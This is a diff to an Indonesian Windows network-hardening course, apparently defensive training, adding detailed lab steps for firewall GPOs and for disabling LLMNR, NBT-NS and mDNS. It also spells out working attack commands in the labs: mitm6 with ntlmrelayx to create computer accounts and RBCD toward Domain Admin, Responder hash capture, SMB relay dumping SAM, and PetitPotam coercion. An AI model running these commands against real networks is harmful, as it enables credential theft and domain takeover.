@@ -381,6 +381,8 @@ Set-Service  WinHttpAutoProxySvc -StartupType Disabled
    - ke **LDAP/LDAPS di DC** → buat **computer account** (menyalahgunakan `ms-DS-MachineAccountQuota`) lalu set **RBCD** (Resource-Based Constrained Delegation) → ambil alih host korban (T1557.001 + abuse delegasi);
    - atau ke **SMB** host lain bila signing tidak diwajibkan.
 
+Prasyarat: `ATTACKER` (Kali, sebagai root) berada di subnet yang sama dengan korban; buka dua terminal.
+
 ```bash
 # Terminal 1 - racuni DNS korban via rogue DHCPv6
 mitm6 -d lab.local
@@ -388,6 +390,8 @@ mitm6 -d lab.local
 # Terminal 2 - relay NTLM ke LDAPS DC: buat computer account + konfigurasi RBCD
 ntlmrelayx.py -6 -t ldaps://dc01.lab.local -wh wpad.lab.local --delegate-access
 ```
+
+→ saat korban memperbarui DHCPv6 lalu me-resolve `wpad`, mitm6 (Terminal 1) mencatat korban ter-racuni dan ntlmrelayx (Terminal 2) melaporkan relay ke LDAPS **SUCCEED**, lalu membuat computer account + mengonfigurasi RBCD (pola observasi serupa Lab 5: `SUCCEED` → aksi pada target). Bila mitigasi di tabel bawah aktif, relay **gagal/skip**.
 
 **KENAPA berbahaya:** rantai ini membawa penyerang dari *unauthenticated di jaringan* ke *Domain Admin* **tanpa exploit memori** — murni menyalahgunakan default IPv6 + WPAD + NTLM + ketiadaan signing. Karena itu harus ditutup terpisah dari Responder.
 
@@ -700,12 +704,17 @@ New-NetIPsecRule -DisplayName "Domain Isolation - Require Inbound Auth" `
 
 **Topologi:** `DC01` (Windows Server 2022, AD DS + DNS), `CLIENT01` (Windows 11), `ATTACKER` (Kali/Linux untuk Responder & nmap). Semua di subnet lab `10.10.0.0/24`.
 
+**Prasyarat eksekusi:** jalankan perintah Windows dari **PowerShell/cmd elevated (Run as administrator)** di host yang disebut tiap langkah; perintah pada `ATTACKER` dijalankan di Kali sebagai root (`sudo`).
+
 ### Lab 1 — Firewall default-deny via GPO
 
-1. Di `DC01`, buat GPO baru (lihat Modul 03) bernama `WS - Network Hardening`, link ke OU server.
-2. Set profile properties: Inbound = Block, Outbound = Allow, Logging on (16384 KB).
-3. Tambahkan inbound rule: izinkan TCP 3389 hanya dari `10.10.0.0/24`.
-4. **Lakukan:** `gpupdate /force` di `CLIENT01`. **Konfirmasi dengan:**
+Prasyarat: login di `DC01` sebagai Domain Admin; buka `gpmc.msc` (mekanisme buat/link GPO → Modul 03).
+
+1. Di `DC01`, buat GPO baru bernama `WS - Network Hardening` dan **link ke OU server** (→ Modul 03).
+2. Klik kanan GPO `WS - Network Hardening` > **Edit** untuk membuka Group Policy Management Editor (GPME).
+3. Set profile properties: navigasi **Computer Configuration > Policies > Windows Settings > Security Settings > Windows Defender Firewall with Advanced Security > Windows Defender Firewall with Advanced Security** > klik kanan node tersebut > **Properties** > pada tab **Domain Profile** set **Firewall state = On**, **Inbound connections = Block**, **Outbound connections = Allow**; di bagian **Logging** klik **Customize…** lalu set **Log dropped packets = Yes** dan **Size limit (KB) = 16384** > **OK**.
+4. Tambahkan inbound rule: di node yang sama buka **Inbound Rules** > klik kanan > **New Rule…** > **Port** > **Next** > **TCP** + **Specific local ports = 3389** > **Next** > **Allow the connection** > **Next** > centang profil **Domain** > **Next** > beri nama > **Finish**. Lalu klik kanan rule baru > **Properties** > tab **Scope** > **Remote IP address** > **These IP addresses** > **Add** = `10.10.0.0/24` > **OK**.
+5. **Lakukan:** `gpupdate /force` di `CLIENT01`. **Konfirmasi dengan:**
    `Get-NetFirewallProfile | ft Name,Enabled,DefaultInboundAction` → semua `Block`.
 
 ### Lab 2 — Nonaktifkan SMBv1 + wajibkan signing
@@ -722,11 +731,24 @@ New-NetIPsecRule -DisplayName "Domain Isolation - Require Inbound Auth" `
 
 ### Lab 3 — Matikan LLMNR/NBT-NS lalu uji Responder
 
-1. Jalankan `Responder -I eth0` di `ATTACKER` **sebelum** hardening; trigger resolusi nama salah dari `CLIENT01` (`\\typoshare\x`) → amati hash tertangkap (NetNTLMv2).
-2. **Lakukan** hardening: set `EnableMulticast=0` (LLMNR), `SetTcpipNetbios(2)` (NBT-NS), `EnableMDNS=0` di `CLIENT01`, lalu `gpupdate /force` / reboot.
-3. **Konfirmasi dengan:** ulangi trigger; Responder **tidak** lagi menangkap hash. Verifikasi registry:
+Prasyarat: `ATTACKER` (Kali) berada di subnet yang sama dengan `CLIENT01`; jalankan Responder sebagai root.
+
+1. Di `ATTACKER`, **sebelum** hardening, jalankan: `sudo responder -I eth0` (ganti `eth0` dengan nama interface lab Anda).
+2. Picu resolusi nama salah dari `CLIENT01`: tekan **Win+R** > ketik `\\typoshare\x` > **Enter** (nama `typoshare` sengaja tidak ada agar Windows fallback ke LLMNR/NBT-NS). → di terminal `ATTACKER`, Responder menampilkan **NetNTLMv2 hash** milik akun `CLIENT01`.
+3. **Lakukan** hardening di `CLIENT01` (PowerShell **elevated**):
    ```powershell
-   Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' EnableMulticast
+   # LLMNR off
+   New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' -Force | Out-Null
+   Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' -Name EnableMulticast -Value 0
+   # NBT-NS off (semua adapter ber-IP)
+   Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=TRUE" | ForEach-Object { $_.SetTcpipNetbios(2) }
+   # mDNS off
+   Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters' -Name EnableMDNS -Value 0
+   ```
+   Lalu jalankan `gpupdate /force` (bila lewat GPO) atau **reboot** `CLIENT01` agar efektif.
+4. **Konfirmasi dengan:** ulangi langkah 2; Responder **tidak** lagi menangkap hash. Verifikasi registry:
+   ```powershell
+   Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' EnableMulticast   # → EnableMulticast : 0
    ```
 
 ### Lab 4 — Port scan dari mesin lain
@@ -745,7 +767,7 @@ Tujuan: melihat **bukti konkret** bahwa SMB signing (§3.2) menggagalkan relay �
    # /etc/responder/Responder.conf  ->  SMB = Off, HTTP = Off
    ntlmrelayx.py -t smb://10.10.0.50 -smb2support
    ```
-   Picu autentikasi `VICTIM` (mis. via Responder/mitm6 atau coercion PetitPotam). **Amati:** ntlmrelayx melaporkan autentikasi **SUCCEED** dan menjalankan aksi di `TARGET` (default: dump SAM):
+   Picu autentikasi `VICTIM` ke `ATTACKER`. Cara paling deterministik di lab: di `VICTIM` tekan **Win+R** > ketik `\\<IP-ATTACKER>\x` > **Enter** (Windows mengirim NTLM ke `ATTACKER`, yang di-relay ntlmrelayx ke `TARGET`). Alternatif coercion: `petitpotam.py <IP-ATTACKER> <IP-DC>` dari `ATTACKER`. **Amati:** ntlmrelayx melaporkan autentikasi **SUCCEED** dan menjalankan aksi di `TARGET` (default: dump SAM):
    ```
    [*] Authenticating against smb://10.10.0.50 as LAB\admin SUCCEED
    [*] Service RemoteRegistry is in stopped state
@@ -770,6 +792,8 @@ Tujuan: melihat **bukti konkret** bahwa SMB signing (§3.2) menggagalkan relay �
 ---
 
 ## Perintah Audit/Verifikasi
+
+> Jalankan dari **PowerShell elevated (Run as administrator)** di host target (di server DNS/DC untuk perintah `Get-DnsServer*`). Tiap baris menyebut output yang diharapkan di komentarnya.
 
 ```powershell
 # Firewall: profile aktif & default action (harapkan Inbound=Block)
